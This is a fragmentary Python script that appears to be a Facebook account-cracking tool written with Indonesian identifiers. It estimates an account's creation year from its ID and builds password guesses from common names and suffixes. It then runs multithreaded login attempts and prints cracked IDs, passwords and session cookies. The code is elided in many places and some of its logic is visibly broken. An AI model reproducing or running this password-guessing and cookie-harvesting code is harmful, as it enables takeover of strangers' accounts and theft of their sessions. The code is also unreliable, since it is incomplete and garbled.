...
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2004'
		elif fx[:9] in ['100000000']       :tahunz = '2005'
		elif fx[:8] in ['10000000']        :tahunz = '2006'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2004-2005'
		elif fx[:6] in ['100002','100003'] :tahunz = '2006-2007'
		elif fx[:6] in ['100004']          :tahunz = '2008-2009'
		elif fx[:6] in ['100005','100006'] :tahunz = '2010-2011'
		elif fx[:6] in ['100007','100008'] :tahunz = '2012-2013'
		elif fx[:6] in ['100009']          :tahunz = '2014'
...
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['free fire','freefire','muhammad','Freefire','Free fire','FreeFire','FREEFIRE','FREE FIRE','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','@123','@1234','@12345','#123','#1234','#12345','@#@','#@#','@1#','#321','###','123','1234','12345','123456','@@@']
	global ok , cp
...
def gabung():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			pwx = A+B
			if len(nama)<=15:
				if len(depan)<=14 or len(depan)<=15:
					pass 
				else:
			...
			if len(nama)<=15:
				...
				if len(depan)<=14 or len(depan)<=15:
					try:
						...
						try:
							belakang = nama.split(' ')[15]
							if len(belakang)<=15:pass
							else:
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						print("\n %s[OK] %s | %s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
						print("\r %s[Cookie] %s "%(H,kuki))
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
